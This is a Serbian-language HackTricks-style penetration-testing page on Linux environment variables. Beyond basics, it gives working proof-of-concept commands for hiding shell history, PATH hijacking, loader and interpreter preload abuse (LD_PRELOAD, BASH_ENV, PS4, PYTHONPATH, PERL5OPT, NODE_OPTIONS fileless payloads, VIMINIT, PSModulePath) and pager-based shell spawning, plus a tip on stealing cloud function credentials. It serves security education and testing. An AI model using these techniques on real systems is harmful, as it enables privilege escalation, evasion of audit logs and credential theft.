# Promenljive okruženja u Linuxu

{{#include ../../banners/hacktricks-training.md}}

## Globalne promenljive

Globalne promenljive će nasleđivati **podređeni procesi**.

Globalnu promenljivu za trenutnu sesiju možete da kreirate ovako:

```bash
export MYGLOBAL="hello world"
echo $MYGLOBAL #Prints: hello world
```

Ova promenljiva će biti dostupna vašim trenutnim sesijama i njihovim podređenim procesima.

Promenljivu možete **ukloniti** tako što ćete:

```bash
unset MYGLOBAL
```

## Lokalne promenljive

**Lokalnim promenljivama** može da **pristupi** samo **trenutna ljuska/skripta**.

```bash
LOCAL="my local"
echo $LOCAL
unset LOCAL
```

## Izlistavanje trenutnih promenljivih

```bash
set
env
printenv
cat /proc/$$/environ
cat /proc/`python -c "import os; print(os.getppid())"`/environ
```

Sadržaj `/proc/*/environ` je **razdvojen NUL bajtovima**, pa su ove varijante obično lakše za čitanje:

```bash
tr '\0' '\n' </proc/$$/environ | sort -u
tr '\0' '\n' </proc/<PID>/environ | sort -u
```

Ako tražite **credentials** ili **zanimljivu konfiguraciju servisa** u nasleđenim okruženjima, pogledajte i [Linux Post Exploitation](../post-exploitation/README.md).

## Uobičajene promenljive

Izvor: [https://geek-university.com/linux/common-environment-variables/](https://geek-university.com/linux/common-environment-variables/).<sup>[[5]](#references)</sup>

- **DISPLAY** – ekran koji koristi **X**. Ova promenljiva je obično podešena na **:0.0**, što označava prvi ekran na trenutnom računaru.
- **EDITOR** – tekstualni editor koji korisnik preferira.
- **HISTFILESIZE** – najveći broj redova u history fajlu.
- **HISTSIZE** – broj redova koji se dodaju u history fajl kada korisnik završi sesiju.
- **HOME** – vaš matični direktorijum.
- **HOSTNAME** – ime računara na mreži.
- **LANG** – vaš trenutni jezik.
- **MAIL** – lokacija korisnikovog mail spool-a. Obično **/var/spool/mail/USER**.
- **MANPATH** – lista direktorijuma u kojima se traže stranice uputstva.
- **OSTYPE** – tip operativnog sistema.
- **PS1** – podrazumevani prompt u bash-u.
- **PATH** – čuva putanje do direktorijuma koji sadrže binarne fajlove koje želite da pokrenete navođenjem samo imena fajla, bez relativne ili apsolutne putanje.
- **PWD** – trenutni radni direktorijum.
- **SHELL** – putanja do trenutnog command shell-a (na primer, **/bin/bash**).
- **TERM** – trenutni tip terminala (na primer, **xterm**).
- **TZ** – vaša vremenska zona.
- **USER** – vaše trenutno korisničko ime.

## Zanimljive promenljive za hacking

Nisu sve promenljive podjednako korisne. Iz ofanzivne perspektive, dajte prednost promenljivama koje menjaju **putanje pretrage**, **startup fajlove**, **ponašanje dinamičkog linkera** ili **audit/logovanje**.

### **HISTFILESIZE**

**Promenite vrednost ove promenljive na 0** da bi se, kada **završite sesiju**, **history fajl** (\~/.bash_history) **skratio na 0 redova**.

```bash
export HISTFILESIZE=0
```

### **HISTSIZE**

Promenite **vrednost ove promenljive na 0**, tako da se komande **ne čuvaju u istoriji u memoriji** i ne upisuju ponovo u **datoteku istorije** (\~/.bash_history).

```bash
export HISTSIZE=0
```

### **HISTCONTROL**

Ako je **vrednost ove promenljive postavljena na `ignorespace` ili `ignoreboth`**, nijedna komanda kojoj je dodat razmak na početku neće biti sačuvana u istoriji.

```bash
export HISTCONTROL=ignorespace
```

```bash
$ echo "to save or"
$  echo "not to save"
```

### **HISTFILE**

Usmerite **datoteku istorije** na **`/dev/null`** ili je potpuno uklonite iz okruženja. Ovo je obično pouzdanije nego samo menjanje veličine istorije.

```bash
export HISTFILE=/dev/null
unset HISTFILE
```

### http_proxy & https_proxy

Procesi će koristiti ovde navedeni **proxy** za povezivanje na internet putem **http ili https**.

```bash
export http_proxy="http://10.10.10.10:8080"
export https_proxy="http://10.10.10.10:8080"
```

### all_proxy & no_proxy

- `all_proxy`: podrazumevani proxy za alate/protokole koji ga koriste.
- `no_proxy`: lista za zaobilaženje (hostovi/domeni/CIDR-ovi) za direktno povezivanje.

```bash
export all_proxy="socks5h://10.10.10.10:1080"
export no_proxy="localhost,127.0.0.1,.corp.local,10.0.0.0/8"
```

I male i velike varijante mogu da se koriste, u zavisnosti od alata (`http_proxy`/`HTTP_PROXY`, `no_proxy`/`NO_PROXY`).

### SSL_CERT_FILE & SSL_CERT_DIR

Procesi će verovati sertifikatima navedenim u **ovim promenljivama okruženja**. Ovo je korisno da bi alati kao što su **`curl`**, **`git`**, Python HTTP klijenti ili menadžeri paketa verovali CA sertifikatu pod kontrolom napadača (na primer, da bi proxy za presretanje izgledao legitimno).

```bash
export SSL_CERT_FILE=/path/to/ca-bundle.pem
export SSL_CERT_DIR=/path/to/ca-certificates
```

### **PATH**

Ako privilegovani omotač/skripta izvršava komande **bez apsolutnih putanja**, prednost ima **prvi direktorijum pod kontrolom napadača** u promenljivoj `PATH`. To je osnova mnogih **PATH hijack** napada u alatki `sudo`, cron poslovima, omotačima shell-a i prilagođenim SUID pomoćnim programima. Potražite `env_keep+=PATH`, slabo podešenu vrednost `secure_path` ili omotače koji pozivaju `tar`, `service`, `cp`, `python` itd. po imenu.

```bash
mkdir -p /dev/shm/bin
cat > /dev/shm/bin/tar <<'EOF'
#!/bin/sh
echo '[+] PATH hijack reached' >&2
id
EOF
chmod +x /dev/shm/bin/tar
PATH=/dev/shm/bin:$PATH vulnerable-wrapper
```

Za potpune lance eskalacije privilegija koji zloupotrebljavaju `PATH`, pogledajte [Linux Privilege Escalation](linux-privilege-escalation/README.md).

### **HOME & XDG_CONFIG_HOME**

`HOME` nije samo referenca na direktorijum: mnogi alati automatski učitavaju **dotfiles**, **plugins** i **konfiguraciju po korisniku** iz `$HOME` ili `$XDG_CONFIG_HOME`. Ako privilegovani tok rada sačuva ove vrednosti, **ubacivanje konfiguracije** može biti jednostavnije od **otmice binarne datoteke**.

```bash
export HOME=/dev/shm/fakehome
export XDG_CONFIG_HOME=/dev/shm/fakehome/.config
mkdir -p "$XDG_CONFIG_HOME"
```

Zanimljive mete uključuju `.gitconfig`, `.wgetrc`, `.curlrc`, `.inputrc`, `.pythonrc.py` i datoteke specifične za alate, kao što je `.terraformrc`.

### **LD_PRELOAD, LD_LIBRARY_PATH & LD_AUDIT**

Ove promenljive utiču na **dinamički linker**:

- `LD_PRELOAD`: forsira da se dodatni deljeni objekti učitaju prvi.
- `LD_LIBRARY_PATH`: dodaje direktorijume za pretragu biblioteka na početak liste.
- `LD_AUDIT`: učitava biblioteke za nadzor koje prate učitavanje biblioteka i razrešavanje simbola.

Izuzetno su korisne za **hooking**, **instrumentaciju** i **eskalaciju privilegija** ako privilegovana komanda zadrži njihove vrednosti. U režimu **bezbednog izvršavanja** (`AT_SECURE`, npr. setuid/setgid/capabilities), loader uklanja ili ograničava mnoge od ovih promenljivih. Međutim, greške u parseru u ovoj ranoj fazi loadera i dalje mogu imati ozbiljne posledice, jer se javljaju **pre** pokretanja ciljnog programa.<sup>[[2]](#references)</sup>

```bash
env | grep -E '^LD_'
ldso=$(ls /lib64/ld-linux-*.so.* /lib/*-linux-gnu/ld-linux-*.so.* 2>/dev/null | head -n1)
"$ldso" --list-diagnostics /bin/true | head
"$ldso" --list-tunables /bin/true | head
```

### **GLIBC_TUNABLES**

`GLIBC_TUNABLES` menja rano ponašanje glibc-a (na primer, podešavanja alokatora) i veoma je korisna u exploit laboratorijama. Važna je i iz bezbednosne perspektive zato što je **dinamički učitavač obrađuje veoma rano**. Greška **Looney Tunables** iz 2023. bila je dobar podsetnik da jedna promenljiva okruženja koju obrađuje učitavač može postati **primitiv za lokalno podizanje privilegija** u SUID programima.<sup>[[6]](#references)</sup>

Za CVE-2023-4911 uporedite **izdanje instaliranog paketa distribucije** sa izdanjem koje je dobavljač ispravio i proverite koji se učitavač zaista koristi pri pokretanju novih procesa. Sam uzvodni broj verzije nije pouzdan: Debian je preneo ranjivi parser u svoj paket verzije 2.31, dok su distribucije prenele ispravke bez promene uzvodnog broja. Za praktičan prelaz privilegija potreban je i izvršni fajl sa privilegijama čija promena identiteta nije blokirana opcijom `NoNewPrivs`, montiranjem `nosuid` ili nekom drugom merom ublažavanja. Izbegavajte pokretanje probe koja izaziva pad pomoću neispravnog `GLIBC_TUNABLES` tokom pasivne enumeracije. Pogledajte [Ubuntu tracker](https://ubuntu.com/security/CVE-2023-4911), [Debian tracker](https://security-tracker.debian.org/tracker/CVE-2023-4911) i [Red Hat advisory](https://access.redhat.com/security/cve/cve-2023-4911) da biste proverili primenljivost za konkretno izdanje; Ubuntu-ovo [security notice](https://ubuntu.com/security/notices/USN-6409-1) takođe zahteva ponovno pokretanje nakon ažuriranja.

```bash
GLIBC_TUNABLES=glibc.malloc.tcache_count=0 ./binary
```

### **BASH_ENV & ENV**

Ako se **Bash** pokrene **neinteraktivno**, proverava `BASH_ENV` i učitava tu datoteku pre pokretanja ciljne skripte. Kada se Bash pozove kao `sh` ili u interaktivnom režimu u POSIX stilu, može da proverava i `ENV`. Ovo je klasičan način da se omotač oko shell-a pretvori u izvršavanje koda ako napadač kontroliše okruženje.

```bash
cat > /tmp/pre.sh <<'EOF'
echo '[+] sourced before the target script'
EOF
BASH_ENV=/tmp/pre.sh bash -c 'echo target'
```

Bash ignoriše ove startup datoteke kada se **stvarni/efektivni ID-jevi razlikuju**; `-p` čuva efektivni ID, ali ne omogućava te startup datoteke, pa tačno ponašanje zavisi od toga kako wrapper pokreće shell. Budite oprezni sa privilegovanim wrapper-ima koji pozivaju `setuid()`/`setgid()` **pre** pokretanja Bash-a: kada se ID-jevi ponovo podudare, Bash može da veruje promenljivama `BASH_ENV`, `ENV` i povezanim podacima o stanju shell-a, koje bi inače ignorisao.<sup>[[1]](#references)</sup>

### **PS4 + SHELLOPTS (xtrace)**

Kada Bash radi sa omogućenim **xtrace-om**, proširuje `PS4` i ispisuje ga pre svake praćene komande. `PS4` se proširuje kao prompt, pa se unutar njega izvršava **command substitution**. Ključno je to što se xtrace može uključiti isključivo iz okruženja izvozom `SHELLOPTS=xtrace` — nije potreban `-x` u komandnoj liniji — tako da svaka Bash skripta koju žrtva pokrene omogućava izvršavanje koda.<sup>[[7]](#references)</sup>

```bash
echo 'echo target' > /tmp/victim.sh

# Pure environment-variable injection (no -x flag)
SHELLOPTS=xtrace PS4='$(id > /tmp/ps4-executed)' bash /tmp/victim.sh
cat /tmp/ps4-executed

# Same primitive when a job is run with debugging enabled
PS4='$(touch /tmp/ps4-x)' bash -x /tmp/victim.sh
```

`PS4` ne radi dok xtrace nije aktivan (`SHELLOPTS=xtrace`, `set -x` ili `bash -x`), a Bash odbacuje `SHELLOPTS` u privilegovanim/setuid kontekstima, baš kao `BASH_ENV`.

### **PYTHONPATH, PYTHONHOME, PYTHONSTARTUP, PYTHONINSPECT & PYTHONBREAKPOINT**

Ove promenljive menjaju način pokretanja Pythona:

- `PYTHONPATH`: dodaje putanje za pretragu import-a na početak.
- `PYTHONHOME`: premešta stablo standardne biblioteke.
- `PYTHONSTARTUP`: izvršava datoteku pre interaktivnog prompta.
- `PYTHONINSPECT=1`: prelazi u interaktivni režim nakon završetka skripte.
- `PYTHONBREAKPOINT`: poziva `package.module.callable` (i uvozi njegov modul) kada kod dođe do `breakpoint()`.<sup>[[8]](#references)</sup>

Korisne su protiv skripti za održavanje, debagera, shell-ova i omotača koji pokreću Python uz kontrolisivo okruženje. `python -E` i `python -I` ignorišu sve promenljive `PYTHON*`.

```bash
mkdir -p /tmp/pylib
printf 'print("owned from PYTHONPATH")\n' > /tmp/pylib/htmod.py
PYTHONPATH=/tmp/pylib python3 -c 'import htmod'
PYTHONPATH=/tmp/pylib python3 -I -c 'import htmod'   # ignored in isolated mode

# PYTHONBREAKPOINT: runs when the target reaches breakpoint()
printf 'import sys\nbreakpoint(*sys.argv[1:])\n' > /tmp/bp.py
PYTHONBREAKPOINT='os.system' python3 /tmp/bp.py 'id'   # requires the code to hit breakpoint()
```

Nedavni primer iz stvarnog sveta bio je LPE ranjivost u **needrestart** iz 2024. godine na Ubuntu/Debian sistemima: skener u vlasništvu root-a kopirao je `PYTHONPATH` neprivilegovanog procesa iz `/proc/<PID>/environ`, a zatim pokretao Python. Objavljeni exploit postavio je `importlib/__init__.so` u putanju koju kontroliše napadač, tako da je Python izvršio kod napadača tokom sopstvene inicijalizacije, pre nego što je skripta pomoćnog programa sa unapred zadatom putanjom uopšte postala bitna.<sup>[[3]](#references)</sup>

### **PERL5OPT & PERL5LIB**

Perl ima podjednako korisne promenljive za pokretanje:

- `PERL5LIB`: dodaje direktorijume biblioteka na početak liste.
- `PERL5OPT`: ubacuje opcije kao da se nalaze u komandnoj liniji svake komande `perl`.

To može da nametne **automatsko učitavanje modula** ili promeni ponašanje interpretera pre nego što ciljna skripta uradi bilo šta zanimljivo. Perl ignoriše ove promenljive u kontekstima **taint / setuid / setgid**, ali su i dalje veoma bitne za uobičajene omotače koji se pokreću kao root, CI zadatke, instalacione programe i prilagođena sudoers pravila.

Ako sudo pravilo dozvoljava zamenu vrednosti okruženja, a privilegovana komanda na kraju pokreće Perl, proverite i `PERL5DB`. Perl dokumentacija navodi da `PERL5OPT=-d` pokreće debugger, a da `PERL5DB` zadaje inicijalizacioni kod za debugger kada se Perl pokrene sa samostalnom opcijom `-d`. Uklanjanje samo `PERL5LIB` i `PERLLIB` ne zatvara ovaj vektor. Promenljive moraju da budu sačuvane kroz sudo i omotač, a Perl proces ne sme da ih ignoriše zbog taint ili set-ID obrade; pregledajte tačno pravilo i lanac izvršavanja, bez pokretanja privilegovanog pomoćnog programa tokom enumeracije. Pogledajte [referencu za promenljive okruženja u perlrun](https://perldoc.perl.org/perlrun#ENVIRONMENT).

Perlova ugrađena putanja za pretragu [`@INC`](https://perldoc.perl.org/perlvar#@INC) predstavlja još jednu granicu poverenja za module, čak i kada promenljive okruženja nisu sačuvane. Za privilegovani Perl proces, povežite stvarnu naredbu `use` ili `require` sa razrešenim imenom modula, redosledom pretrage i mogućnošću korisnika sa nižim privilegijama da kreira ili zameni taj modul u direktorijumu koji se pretražuje. Sama činjenica da je direktorijum biblioteke upisiv ne dokazuje da će privilegovani proces učitati kod iz njega.

```bash
mkdir -p /tmp/perllib
cat > /tmp/perllib/HT.pm <<'EOF'
package HT;
BEGIN { print "PERL5OPT_TRIGGERED\n" }
1;
EOF
PERL5LIB=/tmp/perllib PERL5OPT=-MHT perl -e 'print "target\n"'
```

### **NODE_OPTIONS**

`NODE_OPTIONS` dodaje **Node.js CLI flags** na početak argumenata svakog `node` procesa koji nasledi okruženje. Zbog toga je koristan protiv wrapper-a, CI poslova, Electron pomoćnih procesa i sudo pravila koja na kraju pozivaju Node. Najzanimljiviji flagovi za ofanzivnu upotrebu obično su:

- `--require <file>`: učitava CommonJS datoteku pre ciljne skripte.
- `--import <module>`: učitava ES module pre ciljne skripte.

Node odbacuje neke opasne flagove u `NODE_OPTIONS`, ali `--require` i `--import` su izričito dozvoljeni i obrađuju se **pre** uobičajenih argumenata komandne linije.<sup>[[4]](#references)</sup>

```bash
cat > /tmp/preload.js <<'EOF'
console.error('[+] NODE_OPTIONS preload reached')
EOF
NODE_OPTIONS='--require /tmp/preload.js' node -e 'console.log("target")'
```

#### Fileless preload pomoću `data:` URL-a

Kada možete da podesite `NODE_OPTIONS`, ali **ne možete da upišete fajl** na cilj (fajl-sistem samo za čitanje, ograničeni API, serverless runtime itd.), `--import` prihvata URL oblika `data:text/javascript,`, pa se ceo payload prenosi unutar same promenljive okruženja. JavaScript mora biti **potpuno URL-enkodiran** — Node parsira vrednost kao URL, pa svaki neenkodirani razmak (ili drugi znak) prekida payload i izaziva `SyntaxError`. Ovo radi na Node 20.6+, gde je `--import` na listi dozvoljenih opcija za `NODE_OPTIONS`.<sup>[[4]](#references)</sup>

```bash
# fileless proof of execution (note: no raw spaces in the data URL)
NODE_OPTIONS='--import data:text/javascript,console.log(%22fileless_preload%22)' node -e 'console.log("target")'

# Real payload, URL-encoded (run a command / exfiltrate env vars)
PAYLOAD=$(python3 - <<'PY'
import urllib.parse
js = "import('child_process').then(cp=>console.log(cp.execSync('id').toString()))"
print("--import data:text/javascript," + urllib.parse.quote(js, safe=""))
PY
)
NODE_OPTIONS="$PAYLOAD" node -e 'console.log("target")'
```

> [!TIP]
> Ovo je čest način da se kontrola nad `NODE_OPTIONS` pretvori u RCE u **upravljanim cloud okruženjima za izvršavanje** čije funkcije koriste Node. Na primer, napadač koji može samo da promeni konfiguraciju Lambda funkcije (`lambda:UpdateFunctionConfiguration`, bez `iam:PassRole` i bez ažuriranja koda) može da ubaci `NODE_OPTIONS=--import data:text/javascript,<payload>` i pokrene kod unutar funkcije, a zatim ukrade njene akreditive execution role. Ubačeni modul se izvršava **pre** handlera, koji nakon toga nastavlja da se izvršava normalno.

Za udaljene lance gadgeta koji posredno postavljaju `NODE_OPTIONS` (na primer, prototype pollution do RCE), pogledajte [ovu drugu stranicu](../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce.md).

### **RUBYLIB & RUBYOPT**

Ruby omogućava isti tip zloupotrebe pri pokretanju:

- `RUBYLIB`: dodaje direktorijume na početak putanje za učitavanje Ruby-ja.
- `RUBYOPT`: ubacuje opcije komandne linije, kao što je `-r`, u svako pozivanje `ruby`.

```bash
mkdir -p /tmp/rubylib
printf 'warn "[+] RUBYOPT preload reached"\n' > /tmp/rubylib/ht.rb
RUBYLIB=/tmp/rubylib RUBYOPT='-rht' ruby -e 'puts :target'
```

Vulnerabilnosti u **needrestart**-u iz 2024. godine pokazale su da ovo nije samo laboratorijski trik: isti pomoćni program u vlasništvu root-a, koji je bio ranjiv na zloupotrebu `PYTHONPATH`-a, mogao je da se navede i da pokrene Ruby sa `RUBYLIB`-om pod kontrolom napadača, učitavajući `enc/encdb.so` iz direktorijuma napadača.<sup>[[3]](#references)</sup>

### **VIMINIT & EXINIT**

Vim/Neovim tokom uobičajenog pokretanja izvršavaju Ex komande navedene u `VIMINIT`-u (ili njegovoj rezervnoj varijanti `EXINIT`). Ex komande obuhvataju `:!cmd` i `:call system(...)`, pa kontrola nad promenljivom omogućava izvršavanje koda svaki put kada žrtva otvori Vim (na primer, `sudo vim` kao root, `crontab -e`, `visudo`, ili kada `git`/`less` pokrene `$EDITOR`).<sup>[[9]](#references)</sup>

```bash
echo hi > /tmp/victim.txt
printf ':qa!\n' | VIMINIT='silent! !touch /tmp/vim-executed' vim /tmp/victim.txt
test -e /tmp/vim-executed && echo 'VIMINIT executed'
```

Režim batch (`vim -es`/`-Es`) preskače ove promenljive, ali ih normalno interaktivno pokretanje izvršava.

### **PowerShell (pwsh): PSModulePath, DOTNET_STARTUP_HOOKS & CLR profiler**

PowerShell Core (`pwsh`) radi na Linux/macOS (i Windows-u) i .NET je aplikacija, pa nekoliko promenljivih okruženja može da pretvori bilo koje pokretanje `pwsh`-a sa nasleđenim okruženjem u izvršavanje koda — korisno protiv cron/systemd poslova, CI runner-a i privilegovanih omotača koji pokreću `pwsh`.

- `PSModulePath`: PowerShell rekurzivno pretražuje svaki direktorijum sa ove liste u potrazi za `.psd1`/`.psm1` modulima i **automatski učitava** modul kada se prvi put pozove komanda koju on izvozi. Dodajte direktorijum na početak liste i kod na najvišem nivou vašeg modula izvršiće se prilikom uvoza; pošto je redosled razrešavanja *Alias → Function → Cmdlet*, izvezena funkcija može čak da zaseni ugrađeni cmdlet koji žrtva poziva.<sup>[[10]](#references)</sup>
- `XDG_CONFIG_HOME`: premešta `powershell/Microsoft.PowerShell_profile.ps1`, koji se izvršava pri pokretanju (osim ako se koristi `-NoProfile`).
- `DOTNET_STARTUP_HOOKS`: upravljani sklop čiji se `StartupHook.Initialize()` izvršava pre funkcije `Main` (zajednički za svaku .NET aplikaciju).
- `CORECLR_ENABLE_PROFILING=1` + `CORECLR_PROFILER={guid}` + `CORECLR_PROFILER_PATH=/path/evil.so`: CLR profiling API učitava biblioteku napadača u proces pri pokretanju (promenljive putanje imaju prednost nad registrom; `DOTNET_*` je noviji alias). U Windows PowerShell 5.1 (.NET Framework) koristite `COR_ENABLE_PROFILING`/`COR_PROFILER`/`COR_PROFILER_PATH`. MITRE ATT&CK T1574.012.<sup>[[11]](#references)</sup>

```bash
# PSModulePath module auto-load hijack
mkdir -p /tmp/evil/Hijack
printf 'New-Item -ItemType File /tmp/ps-mod-exec -Force|Out-Null\nfunction Invoke-Report{}\nExport-ModuleMember -Function Invoke-Report\n' > /tmp/evil/Hijack/Hijack.psm1
printf "@{ModuleVersion='1.0';RootModule='Hijack.psm1';FunctionsToExport=@('Invoke-Report')}\n" > /tmp/evil/Hijack/Hijack.psd1
PSModulePath="/tmp/evil:$PSModulePath" pwsh -Command 'Invoke-Report'
test -e /tmp/ps-mod-exec && echo 'PSModulePath auto-load executed'
```

Na Windows-u, `PSExecutionPolicyPreference=Bypass` dodatno uklanja zaštitnu meru koja blokira „nepotpisane skripte“, pa se ubačeni profil/modul zaista izvršava. Pogledajte posebnu stranicu za kompletne PoC-ove:

{{#ref}}
../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-powershell-applications-injection.md
{{#endref}}

### **PAGER, MANPAGER, GIT_PAGER, GIT_EDITOR & LESSOPEN**

Neki alati ne čitaju samo putanju iz okruženja; prosleđuju vrednost **shell-u**, **editoru** ili **pretprocesoru ulaza**. Zbog toga su sledeće promenljive naročito zanimljive kada privilegovani wrapper pokreće `git`, `man`, `less` ili slične preglednike teksta:

- `PAGER`, `MANPAGER`, `GIT_PAGER`: biraju komandu za pager.
- `GIT_EDITOR`, `VISUAL`, `EDITOR`: biraju komandu za editor, često sa argumentima.
- `LESSOPEN`, `LESSCLOSE`: definišu predprocesore/postprocesore koji se pokreću kada `less` otvori datoteku.

```bash
PAGER='sh -c "exec sh 0<&1 1>&1"' man man

cat > /tmp/lesspipe.sh <<'EOF'
#!/bin/sh
echo '[+] LESSOPEN triggered' >&2
cat "$1"
EOF
chmod +x /tmp/lesspipe.sh
LESSOPEN='|/tmp/lesspipe.sh %s' less /etc/hosts
```

Git takođe podržava **ubrizgavanje konfiguracije isključivo putem promenljivih okruženja** bez upisivanja na disk, pomoću `GIT_CONFIG_COUNT`, `GIT_CONFIG_KEY_<n>` i `GIT_CONFIG_VALUE_<n>`:

```bash
GIT_CONFIG_COUNT=1 \
GIT_CONFIG_KEY_0=core.pager \
GIT_CONFIG_VALUE_0='sh -c "exec sh 0<&1 1>&1"' \
git -p help
```

Iz perspektive post-exploitation-a, imajte na umu i da nasleđena okruženja često sadrže **credentials**, **proxy settings**, **service tokens** ili **cloud keys**. Pogledajte [Linux Post Exploitation](../post-exploitation/README.md) za traženje promenljivih u `/proc/<PID>/environ` i `systemd` `Environment=`.

### PS1

Promenite izgled prompta.

[**Ovo je primer**](https://gist.github.com/carlospolop/43f7cd50f3deea972439af3222b68808)

Root:

![PERL5OPT & PERL5LIB - PS1: Ovo je primer](<../images/image (897).png>)

Običan korisnik:

![PERL5OPT & PERL5LIB - PS1: Jedan, dva i tri zadatka pokrenuta u pozadini](<../images/image (740).png>)

Jedan, dva i tri zadatka pokrenuta u pozadini:

![PERL5OPT & PERL5LIB - PS1: Jedan, dva i tri zadatka pokrenuta u pozadini](<../images/image (145).png>)

Jedan zadatak u pozadini, jedan zaustavljen, a poslednja komanda nije ispravno završena:

![PERL5OPT & PERL5LIB - PS1: Jedan zadatak u pozadini, jedan zaustavljen, a poslednja komanda nije ispravno završena](<../images/image (715).png>)

## References

- [1] [GNU Bash Manual - Datoteke za pokretanje Bash-a](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html)
- [2] [ld.so(8) - Priručnik za Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [3] [Qualys - LPE-ovi u needrestart-u](https://www.qualys.com/2024/11/19/needrestart/needrestart.txt)
- [4] [Dokumentacija za Node.js CLI - `NODE_OPTIONS`](https://nodejs.org/api/cli.html)
- [5] [Uobičajene promenljive okruženja - Geek University](https://geek-university.com/linux/common-environment-variables/)
- [6] [CVE-2023-4911: Looney Tunables - Lokalna eskalacija privilegija u glibc-ovom ld.so - Qualys](https://blog.qualys.com/vulnerabilities-threat-research/2023/10/03/cve-2023-4911-looney-tunables-local-privilege-escalation-in-the-glibcs-ld-so)
- [7] [GNU Bash Manual - Promenljive Bash-a (`PS4`) i ugrađena komanda Set (`xtrace`/`SHELLOPTS`)](https://www.gnu.org/software/bash/manual/html_node/Bash-Variables.html)
- [8] [PEP 553 - Ugrađeni breakpoint() i PYTHONBREAKPOINT](https://peps.python.org/pep-0553/)
- [9] [Vim dokumentacija - starting.txt (`VIMINIT`, `EXINIT`)](https://vimhelp.org/starting.txt.html#initialization)
- [10] [about_PSModulePath i automatsko učitavanje PowerShell modula](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_psmodulepath)
- [11] [Podešavanja za otklanjanje grešaka i profilisanje u .NET-u (promenljive profilera `CORECLR_`/`DOTNET_`/`COR_`)](https://learn.microsoft.com/en-us/dotnet/core/runtime-config/debugging-profiling)
{{#include ../../banners/hacktricks-training.md}}
